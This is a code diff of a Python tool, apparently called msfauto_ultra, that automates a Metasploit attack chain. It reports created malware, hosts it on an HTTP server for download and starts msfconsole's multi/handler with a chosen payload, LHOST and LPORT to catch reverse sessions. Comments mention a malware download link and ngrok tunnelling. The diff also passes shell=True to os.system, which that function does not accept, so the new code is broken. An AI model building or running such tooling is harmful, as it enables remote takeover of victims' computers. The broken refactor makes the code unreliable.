@@ -1,4 +1,3 @@
-# /bin/shell
 from tkinter import * 
 from tkinter import messagebox as msg
 from colorama import Fore, Back, Style, init
@@ -18,9 +17,8 @@ class msfauto_ultra():
         print(Fore.GREEN + "Malware created. continue...")
     def craete_http_server(self):
         create_output_folder()
-        # os.system(), print(Fore.RED + "You closed http server.")
-        http_server = subprocess.Popen(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}", shell=True)
-        http_server.wait()
+        os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}", shell=True)
+        print(Fore.RED + "You closed http server.")
     def return_links(self):  
         pass
         # print(Fore.WHITE + "\n\nThis is the malware download link: ")
@@ -32,20 +30,14 @@ class msfauto_ultra():
         # print(f"ngrok http {self.port2}")
     def start_msfconsole(self):
         print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
-        msfconsole = subprocess.Popen(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"', shell=True)
-        msfconsole.wait()
+        os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"', shell=True)
     def start_together(self):
         command1 = f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"
-        process1 = subprocess.Popen(command1, shell=True)
-
-        # Command 2
+        server = subprocess.Popen(command1, shell=True)
         command2 = f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"'
-        process2 = subprocess.Popen(command2, shell=True)
-
-        # Wait for both processes to finish
-        process1.wait()
-        process2.wait()
-
+        msf = subprocess.Popen(command2, shell=True)
+        server.wait()
+        msf.wait()
 def banner():
     banners = {
         1 : f"""{Fore.CYAN}
